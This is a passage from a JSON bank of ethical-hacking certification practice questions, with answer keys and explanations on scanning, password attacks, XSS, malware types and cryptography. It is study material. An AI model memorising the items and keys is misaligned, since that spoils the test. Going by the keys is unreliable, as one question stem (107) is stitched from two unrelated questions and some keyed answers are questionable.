      "explanation": "A botnet is a number of Internet-connected devices running bots that allow the attacker to control them using command and control software. Botnets are used for DDoS attacks, stealing data, sending spam, and allowing attackers to access devices remotely."
    },
    {
      "q": 88,
      "type": "MCQ",
      "question": "To send an email using SMTP protocol which does not encrypt messages and leaving the information vulnerable to being read by an unauthorized person. To solve this problem, SMTP can upgrade a connection between two mail servers to use TLS, and the transmitted emails will be encrypted. Which of the following commands is used by SMTP to transmit email over TLS?",
      "options": [
        "OPPORTUNISTICTLS",
        "UPGRADETLS",
        "STARTTLS",
        "FORCETLS"
      ],
      "correct": "C",
      "explanation": "STARTTLS is a protocol command used to inform the email server that the email client wants to upgrade from an insecure connection to a secure one using TLS or SSL. It's used with SMTP and IMAP to encrypt email transmission."
    },
    {
      "q": 89,
      "type": "MCQ",
      "question": "The company secretly hired hacker Ivan to attack its competitors before a major tender. Ivan did not start with complex technological attacks but decided to hit the employees and their reputation. To do this, he collected personal information about key employees of a competitor company. Then he began to distribute it in the open form on the Internet by adding false information about past racist statements of employees. As a result of the scandal in social networks and the censure of employees, competitors lost the opportunity to win the tender, and Ivan's work was done. What is the name of this form of attack?",
      "options": [
        "Vishing",
        "Piggybacking",
        "Doxing",
        "Daisy-chaining"
      ],
      "correct": "C",
      "explanation": "Doxing is the malicious identification and online publication of information about an individual, including PII or other sensitive/damaging content. It may contain concocted or factually inaccurate information designed to slander the victim, as in this scenario."
    },
    {
      "q": 90,
      "type": "MCQ",
      "question": "Which of the following is a component of IPsec that performs protocol-level functions required to encrypt and decrypt the packets?",
      "options": [
        "IPsec Policy Agent",
        "Internet Key Exchange (IKE)",
        "IPsec driver",
        "Oakley"
      ],
      "correct": "C",
      "explanation": "The IPsec driver is software that performs protocol-level functions required to encrypt and decrypt packets. It handles the actual encryption/decryption operations at the protocol level."
    },
    {
      "q": 91,
      "type": "MCQ",
      "question": "You need to conduct a technical assessment of the network for a small company that supplies medical services. All computers in the company use Windows OS. What is the best approach for discovering vulnerabilities?",
      "options": [
        "Check MITRE.org for the latest list of CVE findings.",
        "Use a scan tool like Nessus.",
        "Create a disk image of a clean Windows installation.",
        "Use the built-in Windows Update tool."
      ],
      "correct": "B",
      "explanation": "Nessus is a proprietary vulnerability scanner that can scan for vulnerabilities, misconfigurations, default passwords, missing patches, and compliance issues. It's specifically designed for comprehensive vulnerability assessment across operating systems, network devices, and applications."
    },
    {
      "q": 92,
      "type": "MCQ",
      "question": "As a result of the attack on the dating web service, Ivan received a dump of all user passwords in a hashed form. Ivan recognized the hashing algorithm and started identifying passwords. What tool is he most likely going to use if the service used hashing without salt?",
      "options": [
        "Brute force",
        "Rainbow table",
        "XSS",
        "Dictionary attacks"
      ],
      "correct": "B",
      "explanation": "A rainbow table is a precomputed table for cracking password hashes. When passwords are hashed without salt, rainbow tables are very effective as the same password always produces the same hash. Salt makes rainbow tables infeasible."
    },
    {
      "q": 93,
      "type": "MCQ",
      "question": "Evil Russian hacker Ivan is attacking again! This time, he got a job in a large American company to steal commercial information for his customer to gain a competitive advantage in the market. In his attack, Ivan used all available means, especially blackmail, bribery, and technological surveillance. What is the name of such an attack?",
      "options": [
        "Social Engineering",
        "Business Loss",
        "Information Leakage",
        "Corporate Espionage"
      ],
      "correct": "D",
      "explanation": "Corporate espionage (industrial espionage) is the practice of using espionage techniques for commercial or financial purposes. It includes trespassing, posing as employees, wiretapping, hacking, attacking websites with malware, and using blackmail and bribery to steal trade secrets."
    },
    {
      "q": 94,
      "type": "MCQ",
      "question": "John, a cybersecurity specialist, wants to perform a syn scan in his company's network. He has two machines. The first machine (192.168.0.98) has snort installed, and the second machine (192.168.0.151) has kiwi Syslog installed. When he started a syn scan in the network, he notices that kiwi Syslog is not receiving the alert message from snort. He decides to run Wireshark in the snort machine to check if the messages are going to the kiwi Syslog machine. What Wireshark filter will show the connections from the snort machine to kiwi Syslog machine?",
      "options": [
        "tcp.dstport==514 && ip.dst==192.168.0.0/16",
        "tcp.srcport==514 && ip.src==192.168.0.98",
        "tcp.srcport==514 && ip.src==192.168.151",
        "tcp.dstport==514 && ip.dst==192.168.0.151"
      ],
      "correct": "D",
      "explanation": "The filter should show traffic from snort machine going TO kiwi Syslog machine. Syslog uses port 514. The destination IP is 192.168.0.151 (kiwi Syslog), so the filter is tcp.dstport==514 && ip.dst==192.168.0.151"
    },
    {
      "q": 95,
      "type": "MCQ",
      "question": "Sniffing is a process of monitoring and capturing all data packets passing through a given network. An intruder can capture and analyze all network traffic by placing a packet sniffer on a network in promiscuous mode. Sniffing can be either Active or Passive in nature. How does passive sniffing work?",
      "options": [
        "This is the process of sniffing through the router.",
        "This is the process of sniffing through the switch.",
        "This is the process of sniffing through the hub.",
        "This is the process of sniffing through the gateway."
      ],
      "correct": "C",
      "explanation": "Passive sniffing is the process of sniffing through a hub. In a hub-based network, all traffic is sent to all machines on the segment, so sniffers can passively wait for data to be sent and capture it without injecting any traffic."
    },
    {
      "q": 96,
      "type": "MCQ",
      "question": "A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. They are classified according to the place of their injection. What type of rootkit loads itself underneath the computer's operating system and can intercept hardware calls made by the original operating system.",
      "options": [
        "Application rootkit",
        "Hypervisor (Virtualized) Rootkits",
        "Memory rootkit",
        "Kernel mode rootkits"
      ],
      "correct": "B",
      "explanation": "A hypervisor rootkit takes advantage of hardware virtualization and is installed between the hardware and the kernel, acting as the real hardware. It can intercept communication between the hardware and the host operating system."
    },
    {
      "q": 97,
      "type": "MCQ",
      "question": "Which of the following is a common IDS evasion technique?",
      "options": [
        "Unicode characters",
        "Spyware",
        "Port knocking",
        "Subnetting"
      ],
      "correct": "A",
      "explanation": "Using Unicode representation is an effective way to evade IDSs. Each character has a unique value regardless of platform, program, or language. For example, using Unicode character c1 to represent a slash for a Web page request can evade IDS detection."
    },
    {
      "q": 98,
      "type": "MCQ",
      "question": "You want to surf safely and anonymously on the Internet. Which of the following options will be best for you?",
      "options": [
        "Use Tor network with multi-node.",
        "Use VPN.",
        "Use public WiFi.",
        "Use SSL sites."
      ],
      "correct": "A",
      "explanation": "Tor is free and open-source software that directs Internet traffic through a worldwide volunteer overlay network of relays to conceal user location and usage. Using Tor with multi-node routing provides the highest level of anonymity by encrypting data multiple times through random relays."
    },
    {
      "q": 99,
      "type": "MCQ",
      "question": "How can resist an attack using rainbow tables?",
      "options": [
        "Use of non-dictionary words.",
        "Use password salting.",
        "Lockout accounts under brute force password cracking attempts.",
        "All uppercase character passwords."
      ],
      "correct": "B",
      "explanation": "Password salting adds random data to passwords before hashing. Since salts are different for each password, they defend against pre-computed hash attacks like rainbow tables by making all salted hash instances for the same password different from each other."
    },
    {
      "q": 100,
      "type": "MCQ",
      "question": "Which of the following best describes the operation of the Address Resolution Protocol?",
      "options": [
        "It sends a reply packet for a specific IP, asking for the MAC address.",
        "It sends a request packet to all the network elements, asking for the MAC address from a specific IP.",
        "It sends a request packet to all the network elements, asking for the domain name from a specific IP.",
        "It sends a reply packet to all the network elements, asking for the MAC address from a specific IP."
      ],
      "correct": "B",
      "explanation": "ARP broadcasts a request packet to all the LAN machines asking if any machine is using a particular IP address. When a machine recognizes the IP as its own, it sends a reply so ARP can update the cache and proceed with communication."
    },
    {
      "q": 101,
      "type": "MCQ",
      "question": "During the security audit, Gabriella used Wget to read exposed information from a remote server and got server information including OS and software versions. What is the name of this method of obtaining information?",
      "options": [
        "Banner grabbing",
        "SQL injection",
        "XML External Entities (XXE)",
        "Cross-site scripting"
      ],
      "correct": "A",
      "explanation": "Banner grabbing is the act of capturing information provided by banners - configurable text-based welcome screens from network hosts that display system information like OS, service packs, software versions, and web services. It's used for vulnerability analysis and penetration testing."
    },
    {
      "q": 102,
      "type": "MCQ",
      "question": "Which characteristic is most likely not to be used by companies in biometric control for use on the company's territory?",
      "options": [
        "Iris patterns",
        "Fingerprints",
        "Height/Weight",
        "Voice"
      ],
      "correct": "C",
      "explanation": "Height and weight are much more difficult to use for biometric control as they can be easily changed and are not unique or stable enough identifiers. Biometric identifiers should be distinctive and measurable - fingerprints, iris patterns, and voice are more reliable."
    },
    {
      "q": 103,
      "type": "MCQ",
      "question": "Alex, a cybersecurity science student, needs to fill in the information into a secured PDF-file job application received from a prospective employer. He can't enter the information because all the fields are blocked. He doesn't want to request a new document that allows the forms to be completed and decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Which attack is the student attempting?",
      "options": [
        "Brute-force attack",
        "Dictionary-attack",
        "Man-in-the-middle attack",
        "Session hijacking"
      ],
      "correct": "B",
      "explanation": "A dictionary attack is a form of brute force attack that tries to determine decryption keys or passphrases by trying thousands or millions of likely possibilities from a list (dictionary) of commonly used passwords or words."
    },
    {
      "q": 104,
      "type": "MCQ",
      "question": "TLS, also known as SSL, is a protocol for encrypting communications over a network. Which of the following statements is correct?",
      "options": [
        "SSL/TLS uses do not uses asymmetric or symmetric encryption.",
        "SSL/TLS uses only symmetric encryption.",
        "SSL/TLS uses only asymmetric encryption.",
        "SSL/TLS uses both asymmetric and symmetric encryption."
      ],
      "correct": "D",
      "explanation": "SSL/TLS uses both asymmetric and symmetric encryption. Asymmetric encryption is used to establish a secure session between client and server, and symmetric encryption is used to exchange data within the secured session for an excellent balance between safety and speed."
    },
    {
      "q": 105,
      "type": "MCQ",
      "question": "Which of the following Linux-based tools will help you change any user's password or activate disabled accounts if you have physical access to a Windows 2008 R2 and an Ubuntu 9.10 Linux LiveCD?",
      "options": [
        "CHNTPW",
        "Cain & Abel",
        "SET",
        "John the Ripper"
      ],
      "correct": "A",
      "explanation": "chntpw is a software utility for resetting or blanking local passwords used by Windows NT, 2000, XP, Vista, 7, 8, 8.1 and 10. It does this by editing the SAM database where Windows stores password hashes. It can be used via bootable CD/USB."
    },
    {
      "q": 106,
      "type": "MCQ",
      "question": "Ivan, a black-hat hacker, performs a man-in-the-middle attack. To do this, it uses a rogue wireless AP and embeds a malicious applet in all HTTP connections. When the victims went to any web page, the applet ran. Which of the following tools could Ivan probably use to inject HTML code?",
      "options": [
        "Wireshark",
        "tcpdump",
        "Ettercap",
        "Aircrack-ng"
      ],
      "correct": "C",
      "explanation": "Ettercap is a free and open source network security tool for man-in-the-middle attacks on LAN. It can intercept traffic on a network segment, capture passwords, and conduct active eavesdropping against common protocols, including injecting content into connections."
    },
    {
      "q": 107,
      "type": "MCQ",
      "question": "Identify the attack where the hacker uses the ciphertexts corresponding to a set of plaintexts of his own choosing? The evil hacker Ivan wants to attack the popular air ticket sales service. After careful study, he discovered that the web application is vulnerable to introduced malicious JavaScript code through the application form. This code does not cause any harm to the server itself, but when executed on the client's computer, it can steal his personal data. What kind of attack is Ivan preparing to use?",
      "options": [
        "CSRF",
        "LDAP Injection",
        "XSS",
        "SQL injection"
      ],
      "correct": "C",
      "explanation": "Cross-site scripting (XSS) is a security vulnerability where attackers inject client-side scripts into web pages viewed by other users. The malicious JavaScript executes on the client's computer and can steal personal data like session cookies and passwords."
    },
    {
      "q": 108,
      "type": "MCQ",
      "question": "What is the first and most important phase that is the starting point for penetration testing in the work of an ethical hacker?",
      "options": [
        "Gaining Access",
        "Scanning",
        "Maintaining Access",
        "Reconnaissance"
      ],
      "correct": "D",
      "explanation": "Reconnaissance is the first and most important phase where attackers gather information to understand their target. It includes collecting information about the target organization, network, hosts, and people involved, both actively and passively."
    },
    {
      "q": 109,
      "type": "MCQ",
      "question": "Identify the attack by the description: It is the wireless version of the phishing scam. This is an attack-type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises but has been set up to eavesdrop on wireless communications. When performing this attack, an attacker fools wireless users into connecting a device to a tainted hotspot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent website and luring people there.",
      "options": [
        "Signal Jamming",
        "Sinkhole",
        "Evil Twin",
        "Collision"
      ],
      "correct": "C",
      "explanation": "An evil twin is a fraudulent Wi-Fi access point that appears legitimate but is set up to eavesdrop on wireless communications. The attacker sets up a fake access point with the same SSID and sometimes BSSID as a legitimate network to intercept traffic."
    },
    {
      "q": 110,
      "type": "MCQ",
      "question": "The company is trying to prevent the security breach by applying a security policy in which all Web browsers must automatically delete their HTTP browser cookies upon termination. Identify the security breach that the company is trying to prevent?",
      "options": [
        "Attempts by attackers to access passwords stored on the employee's computer.",
        "Attempts by attackers to determine the employee's web browser usage patterns.",
        "Attempts by attackers to access the user and password information stored in the company's SQL database.",
        "Attempts by attackers to access websites that trust the Web browser user by stealing the employee's authentication credentials."
      ],
      "correct": "D",
      "explanation": "Session hijacking/cookie hijacking involves theft of cookies used to authenticate users to remote servers. By deleting cookies upon browser termination, the company prevents attackers from stealing authentication credentials stored in cookies to access websites that trust the browser user."
    },
    {
      "q": 111,
      "type": "MCQ",
      "question": "Identify which term corresponds to the following description: It is can potentially adversely impact a system through unauthorized access, destruction, disclosure, denial of service or modification of data.",
      "options": [
        "Vulnerability",
        "Risk",
        "Attack",
        "Threat"
      ],
      "correct": "D",
      "explanation": "A threat is a hypothetical event that has the potential to cause some damage to an organization's business and processes. It's what you're trying to protect against and can potentially adversely impact a system through unauthorized access, destruction, disclosure, denial of service or modification of data."
    },
    {
      "q": 112,
      "type": "MCQ",
      "question": "IPsec is a suite of protocols developed to ensure the integrity, confidentiality, and authentication of data communications over an IP network. Which protocol is NOT included in the IPsec suite?",
      "options": [
        "Encapsulating Security Protocol (ESP)",
        "Media Access Control (MAC)",
        "Authentication Header (AH)",
        "Security Association (SA)"
      ],
      "correct": "B",
      "explanation": "The IPsec suite includes Authentication Header (AH), Encapsulating Security Protocol (ESP), Security Association (SA), and runs on top of Internet Protocol (IP). Media Access Control (MAC) is not part of the IPsec suite."
    },
    {
      "q": 113,
      "type": "MCQ",
      "question": "Which of the following is an attack where used precomputed tables of hashed passwords?",
      "options": [
        "Dictionary Attack",
        "Hybrid Attack",
        "Rainbow Table Attack",
        "Brute Force Attack"
      ],
      "correct": "C",
      "explanation": "A rainbow table is a precomputed table for caching the output of cryptographic hash functions, usually for cracking password hashes. It's a space-time tradeoff using less processing time and more storage than brute-force, but more processing time and less storage than simple lookup tables."
    },
    {
      "q": 114,
      "type": "MCQ",
      "question": "In which phase of the ethical hacking process can Google hacking be used? For example: allintitle: root passwd",
      "options": [
        "Reconnaissance",
        "Scanning and Enumeration",
        "Maintaining Access",
        "Gaining Access"
      ],
      "correct": "A",
      "explanation": "Google hacking using operators like 'allintitle:' to search for specific information in page titles is part of the Reconnaissance phase. It's passive information gathering where you collect publicly available information without directly interacting with the target."
    },
    {
      "q": 115,
      "type": "MCQ",
      "question": "Black-hat hacker Ivan wants to determine the status of ports on a remote host. He wants to do this quickly but imperceptibly for IDS systems. For this, he uses a half-open scan that doesn't complete the TCP three-way handshake. What kind of scanning does Ivan use?",
      "options": [
        "PSH Scan",
        "TCP SYN (Stealth) Scan",
        "XMAS scans",
        "FIN scan"
      ],
      "correct": "B",
      "explanation": "TCP SYN (Stealth) Scan is a half-open scan that doesn't complete the TCP three-way handshake. It sends SYN, waits for SYN/ACK or RST response, but never sends the final ACK. It's relatively unobtrusive, stealthy, and fast."
    },
    {
      "q": 116,
      "type": "MCQ",
      "question": "Alex, an employee of a law firm, receives an email with an attachment 'Court_Notice_09082020.zip'. There is a file inside the archive 'Court_Notice_09082020.zip.exe'. Alex does not notice that this is an executable file and runs it. After that, a window appears with the notification 'This word document is corrupt' and at the same time, malware copies data to APPDATA\\local directory takes place in the background and begins to beacon to a C2 server to download additional malicious binaries. What type of malware has Alex encountered?",
      "options": [
        "Trojan",
        "Worm",
        "Key-Logger",
        "Macro Virus"
      ],
      "correct": "A",
      "explanation": "A Trojan horse misleads users of its true intent. It's disguised to appear not suspicious (like a document) but contains malicious code. Trojans are spread by social engineering, don't self-replicate like worms, and can install backdoors to contact C2 servers."
    },
    {
      "q": 117,
      "type": "MCQ",
      "question": "What property is provided by using hash?",
      "options": [
        "Integrity",
        "Confidentiality",
        "Authentication",
        "Availability"
      ],
      "correct": "A",
      "explanation": "Cryptographic hash functions provide integrity verification. Comparing message digests (hash values) calculated before and after transmission can determine whether any changes have been made to the message or file. Hashing does not provide confidentiality (encryption) or authentication by itself."
    },
    {
      "q": 118,
      "type": "MCQ",
      "question": "Assume an attacker gained access to the internal network of a small company and launches a successful STP manipulation attack. What are his next steps?",
      "options": [
        "He will repeat the same attack against all L2 switches of the network.",
        "He will activate OSPF on the spoofed root bridge.",
        "He will repeat this action so that it escalates to a DoS attack.",
        "He will create a SPAN entry on the spoofed root bridge and redirect traffic to his computer."
      ],
      "correct": "D",
      "explanation": "After successfully spoofing the root bridge in an STP attack, the attacker will create a SPAN (Switched Port Analyzer) entry on the spoofed root bridge to redirect and monitor traffic to his computer, allowing him to see frames forwarded from other switches."
    },
    {
      "q": 119,
      "type": "MCQ",
      "question": "Monitoring your company's assets is one of the most important jobs you can perform. What warnings should you try to reduce when configuring security tools, such as security information and event management (SIEM) solutions or intrusion detection systems (IDS)?",
      "options": [
        "Only True Negatives",
        "True Positives and True Negatives",
        "False Positives and False Negatives",
        "Only False Positives"
      ],
      "correct": "C",
      "explanation": "Both False Positives (alerts for non-threats) and False Negatives (no alerts for real threats) should be reduced. False positives burden analysts with pointless investigations. False negatives are worse as real threats go undetected."
    },
    {
      "q": 120,
      "type": "MCQ",
      "question": "Jenny, a pentester, conducts events to detect viruses in systems. She uses a detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities. Which of the following methods does Jenny use?",
      "options": [
        "Code Emulation.",
        "Integrity checking.",
        "Heuristic Analysis.",
        "Vulnerability scanner."
      ],
      "correct": "A",
      "explanation": "Code emulation implements a virtual machine to simulate CPU and memory management systems to mimic code execution. Malicious code is simulated in the virtual machine, and no actual virus code is executed by the real processor. It's an extremely powerful virus detection technique."
    },
    {
      "q": 121,
      "type": "MCQ",
      "question": "Which of the following is an access control mechanism that allows multiple systems to use a CAS that permits users to authenticate once and gain access to multiple systems?",
      "options": [
        "Single sign-on",
        "Discretionary Access Control (DAC)",
        "Role-Based Access Control (RBAC)",
        "Mandatory access control (MAC)"
      ],
      "correct": "A",
      "explanation": "Single sign-on (SSO) is an authentication scheme that allows a user to log in with a single ID and password to any of several related, yet independent, software systems. True SSO allows the user to login once and access services without re-entering authentication factors."
    },
    {
      "q": 122,
      "type": "MCQ",
      "question": "Identify the type of partial breaks in which the attacker discovers a functionally equivalent algorithm for encryption and decryption, but without learning the key?",
      "options": [
        "Information deduction.",
        "Global deduction.",
        "Instance deduction.",
        "Total break."
      ],
      "correct": "B",
      "explanation": "Global deduction is when the attacker discovers a functionally equivalent algorithm for encryption and decryption without learning the key. Other types: Total break (discovers secret key), Instance deduction (discovers additional plaintexts/ciphertexts), Information deduction (gains Shannon information)."
    },
    {
      "q": 123,
      "type": "MCQ",
      "question": "Which of the following is a Denial-of-service vulnerability for which security patches have not yet been released, or there is no effective means of protection?",
      "options": [
        "Zero-Day",
        "Smurf",
        "Yo-yo",
        "APDoS"
      ],
      "correct": "A",
      "explanation": "Zero-day DDoS attacks use new attack vectors (different protocols or variations) that haven't been seen before and for which mitigation vendors don't have custom signatures ready. These can include new protocols for reflection attacks or new botnets with unique signatures."
    },
    {
      "q": 124,
      "type": "MCQ",
      "question": "The fraudster Lisandro, masquerading as a large car manufacturing company recruiter, massively sends out job offers via e-mail with the promise of a good salary, a friendly team, unlimited coffee, and medical insurance. He attaches Microsoft Word or Excel documents to his letters into which he embeds a special virus written in Visual Basic that runs when the document is opened and infects the victim's computer. What type of virus does Lisandro use?",
      "options": [
        "Polymorphic code",
        "Macro virus",
        "Stealth virus",
        "Multipart virus"
      ],
      "correct": "B",
      "explanation": "A macro virus is written in a macro language (programming language embedded inside applications like Microsoft Office, Excel, PowerPoint). Macros can be set to run automatically when the document is opened, providing a mechanism for malicious code to spread."
    },
    {
      "q": 125,
      "type": "MCQ",
      "question": "What flags will be set when scanning when using the following command: #nmap -sX host.companydomain.com",
      "options": [
        "ACK flag is set.",
        "SYN flag is set.",
        "URG, PUSH and FIN are set.",
        "SYN and ACK flags are set."
      ],
      "correct": "C",
      "explanation": "Xmas scan (-sX) sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. According to RFC, any packet not containing SYN, RST, or ACK bits will result in RST if port is closed and no response if port is open."
    }
  ],
  "4": [
    {
      "q": 1,
      "type": "MCQ",
      "question": "Which of the following USB tools using to copy files from USB devices silently?",
      "options": [
        "USBSnoopy",
        "USBGrabber",
        "USBDumper",
        "USBSniffer"
      ],
      "correct": "C",
      "explanation": "USBdumper runs silently as a background process once started and copies the complete contents of every connected usb device to the system without the knowledge of the user."
    },
    {
      "q": 2,
      "type": "MCQ",
      "question": "Identify the encryption algorithm by the description: Symmetric-key block cipher having a classical 12- or 16-round Feistel network with a block size of 64 bits for encryption, which includes large 8 \u00d7 32-bit S-boxes based on bent functions, modular addition and subtraction, key-dependent rotation, and XOR operations. This cipher also uses a 'masking' key and a 'rotation' key for performing its functions.",
      "options": [
        "CAST-128",
        "DES",
        "GOST",
        "AES"
      ],
      "correct": "A",
      "explanation": "CAST-128 is a symmetric-key block cipher used in a number of products, notably as the default cipher in some versions of GPG and PGP. It is a 12- or 16-round Feistel network with a 64-bit block size and uses masking and rotation keys."
    },
    {
      "q": 3,
      "type": "MCQ",
      "question": "You need to increase the security of keys used for encryption and authentication. For these purposes, you decide to use a technique to enter an initial key to an algorithm that generates an enhanced key resistant to brute-force attacks. Which of the following techniques will you use?",
      "options": [
        "KDF",
        "PKI",
        "Key reinstallation",
        "Key stretching"
      ],
      "correct": "D",
      "explanation": "Key stretching techniques are used to make a possibly weak key, typically a password or passphrase, more secure against a brute-force attack by increasing the resources (time and possibly space) it takes to test each possible key."
    },
    {
      "q": 4,
      "type": "MCQ",
      "question": "John, a black hacker, is trying to do an SMTP enumeration. What useful information can John gather during a Simple Mail Transfer Protocol enumeration?",
      "options": [
        "He can receive a list of all mail proxy server addresses used by the company.",
        "He can find information about the daily outgoing message limits before mailboxes are locked.",
        "He can use the internal command RCPT provides a list of ports open.",
        "He can use two internal commands VRFY and EXPN, which provide information about valid users, email addresses, etc."
      ],
      "correct": "D",
      "explanation": "SMTP VRFY and EXPN commands can reveal the actual address of users aliases and lists of email if these commands have not been disabled by the system administrator."
    },
    {
      "q": 5,
      "type": "MCQ",
      "question": "Identify the correct sequence of steps involved in the vulnerability-management life cycle.",
      "options": [
        "Vulnerability scan -> Risk assessment -> Identify assets and create a baseline -> Remediation -> Monitor -> Verification.",
        "Remediation -> Monitor -> Verification -> Vulnerability scan -> Risk assessment -> Identify assets and create a baseline.",
        "Vulnerability scan -> Identify assets and create a baseline -> Risk assessment -> Remediation -> Verification -> Monitor.",
        "Identify assets and create a baseline -> Vulnerability scan -> Risk assessment -> Remediation -> Verification -> Monitor."
      ],
      "correct": "D",
      "explanation": "According to EC-Council courseware, the correct order is: Identify assets and create a baseline, Vulnerability scan, Risk assessment, Remediation, Verification, Monitor."
    },
    {
      "q": 6,
      "type": "MCQ",
      "question": "Which term from the following describes a set of vulnerabilities that allows spyware to be installed on smartphones with the iOS operating system, allowing those who conducted espionage to track and monitor every action on the device?",
      "options": [
        "Androrat",
        "DroidSheep",
        "Trident",
        "Zscaler"
      ],
      "correct": "C",
      "explanation": "Trident are three zero-day vulnerabilities in Apple iOS that allow attackers to silently jailbreak the device and install surveillance software. This was discovered as part of the Pegasus spyware."
    },
    {
      "q": 7,
      "type": "MCQ",
      "question": "Ivan, a black hat hacker, got the username from the target environment. In conditions of limited time, he decides to use a list of common passwords, which he will pass as an argument to the hacking tool. Which of the following is the method of attack that Ivan uses?",
      "options": [
        "Dictionary attack.",
        "Password spraying attack.",
        "Known plaintext attack.",
        "Smudge attack."
      ],
      "correct": "A",
      "explanation": "A dictionary attack is a form of brute force attack technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying thousands or millions of likely possibilities, such as words in a dictionary."
    },
    {
      "q": 8,
      "type": "MCQ",
      "question": "Your boss has instructed you to introduce a hybrid encryption software program into a web application to secure email messages. You are planning to use free software that uses both symmetric-key cryptography and asymmetric-key cryptography for improved speed and secure key exchange. Which of the following meets these requirements?",
      "options": [
        "GPG",
        "S/MIME",
        "SMTP",
        "PGP"
      ],
      "correct": "A",
      "explanation": "GPG (GnuPG) is a free implementation of OpenPGP that uses hybrid encryption - a combination of conventional symmetric-key cryptography for speed, and public-key cryptography for ease of secure key exchange."
    },
    {
      "q": 9,
      "type": "MCQ",
      "question": "In which of the following attacks does the attacker receive information from data sources such as voice assistants, multimedia messages, and audio files by using a malicious app to breach speech privacy?",
      "options": [
        "Spearphone attack",
        "Smudge attack",
        "DroidDream",
        "SIM swap scam"
      ],
      "correct": "A",
      "explanation": "The Spearphone attack breaches speech privacy by exploiting the motion sensor 'accelerometer' and capturing speech reverberations generated through the loudspeaker."
    },
    {
      "q": 10,
      "type": "MCQ",
      "question": "You need to hide the file in the Linux system. Which of the following characters will you type at the beginning of the filename?",
      "options": [
        "! (Exclamation mark)",
        "_ (Underscore)",
        "~ (Tilda)",
        ". (Period)"
      ],
      "correct": "D",
      "explanation": "Linux hides files and folders that have a period at the start of their name. To hide a file or folder, rename it and place a period at the start of the filename."
    },
    {
      "q": 11,
      "type": "MCQ",
      "question": "The attacker needs to collect information about his victim - Maria. She is an extrovert who often posts a large amount of private information, photos, and location tags of recently visited places on social networks. Which automated tool should an attacker use to gather information to perform other sophisticated attacks?",
      "options": [
        "VisualRoute",
        "Hootsuite",
        "HULK",
        "Ophcrack"
      ],
      "correct": "B",
      "explanation": "According to EC-Council training materials, Hootsuite can be used to search for both geotagged and non-geotagged information on social media sites."
    },
    {
      "q": 12,
      "type": "MCQ",
      "question": "To collect detailed information about services and applications running on identified open ports, nmap can perform version detection. Which of the following options will allow you to run this scan?",
      "options": [
        "-sV",
        "-sX",
        "-sF",
        "-sN"
      ],
      "correct": "A",
      "explanation": "-sV enables version detection in Nmap, which interrogates ports to determine service protocol, application name, version number, hostname, and device type."
    },
    {
      "q": 13,
      "type": "MCQ",
      "question": "Alex was assigned to perform a penetration test against a website using Google dorks. He needs to get results with file extensions. Which operator should Alex use to achieve the desired result?",
      "options": [
        "filetype:",
        "define:",
        "site:",
        "inurl:"
      ],
      "correct": "A",
      "explanation": "filetype: restricts results to those of a certain filetype, such as PDF, DOCX, TXT, PPT, etc. The ext: operator can also be used with identical results."
    },
    {
      "q": 14,
      "type": "MCQ",
      "question": "When scanning with Nmap, you found a firewall. Now you need to determine whether it is a stateful or stateless firewall. Which of the following options is best for you to use?",
      "options": [
        "-sT",
        "-sM",
        "-sA",
        "-sO"
      ],
      "correct": "C",
      "explanation": "TCP ACK Scan (-sA) is used to map out firewall rulesets, determining whether they are stateful or not and which ports are filtered."
    },
    {
      "q": 15,
      "type": "MCQ",
      "question": "The company 'Work Town' hired a cybersecurity specialist to perform a vulnerability scan by sniffing the traffic on the network to identify the active systems, network services, applications, and vulnerabilities. What type of vulnerability assessment should be performed for 'Work Town'?",
      "options": [
        "Passive assessment.",
        "Internal assessment.",
        "External assessment.",
        "Active assessment."
      ],
      "correct": "A",
      "explanation": "Passive assessments sniff the traffic present on the network to identify the active systems, network services, applications, and vulnerabilities."
    },
    {
      "q": 16,
      "type": "MCQ",
      "question": "Which of the following tools is an automated tool that eases his work and performs vulnerability scanning to find hosts, services, and other vulnerabilities in the target server?",
      "options": [
        "Netsparker",
        "WebCopier Pro",
        "Infoga",
        "NCollector Studio"
      ],
      "correct": "A",
      "explanation": "Netsparker is an automated, yet fully configurable, web application security scanner that enables you to scan websites, web applications, and web services, and identify security flaws."
    },
    {
      "q": 17,
      "type": "MCQ",
      "question": "The attacker knows about a vulnerability in a bare-metal cloud server that can enable him to implant malicious backdoors in firmware. Also, the backdoor can persist even if the server is reallocated to new clients or businesses that use it as an IaaS. What type of cloud attack can be performed by an attacker exploiting the vulnerability discussed in the above scenario?",
      "options": [
        "Man-in-the-cloud (MITC) attack",
        "Cloud cryptojacking",
        "Cloudborne attack",
        "Metadata spoofing attack"
      ],
      "correct": "C",
      "explanation": "Cloudborne vulnerability can allow attackers to implant backdoor implants in the firmware or BMC of bare-metal servers that survive client reassignment in bare metal and general cloud services."
    },
    {
      "q": 18,
      "type": "MCQ",
      "question": "Which of the following is an anonymizer that masks real IP addresses and ensures complete and continuous anonymity for all online activities?",
      "options": [
        "https://www.wolframalpha.com",
        "https://karmadecay.com",
        "https://www.guardster.com",
        "https://www.baidu.com"
      ],
      "correct": "C",
      "explanation": "Guardster offers various services to let you use the Internet anonymously and securely, including a popular free web proxy service and secure SSH tunnel proxy."
    },
    {
      "q": 19,
      "type": "MCQ",
      "question": "What is the name of the technique in which attackers move around the territory in a moving vehicle and use special equipment and software to search for vulnerable and accessible WiFi networks?",
      "options": [
        "Spectrum analysis",
        "Rogue access point",
        "Wardriving",
        "Wireless sniffing"
      ],
      "correct": "C",
      "explanation": "Wardriving occurs when someone uses software and hardware to locate unsecured wireless networks while traveling around, typically in vehicles."
    },
    {
      "q": 20,
      "type": "MCQ",
      "question": "Storing cryptographic keys carries a particular risk. In cryptography, there is a mechanism in which a third party stores copies of private keys. By using it, you are can ensure that in the case of a catastrophe, be it a security breach, lost or forgotten keys, natural disaster, or otherwise, your critical keys are safe. What is the name of this mechanism?",
      "options": [
        "Key encapsulation",
        "Key schedule",
        "Key escrow",
        "Key whitening"
      ],
      "correct": "C",
      "explanation": "Key escrow is a cryptographic key exchange process in which a key is held in escrow, or stored, by a third party for recovery purposes."
    },
    {
      "q": 21,
      "type": "MCQ",
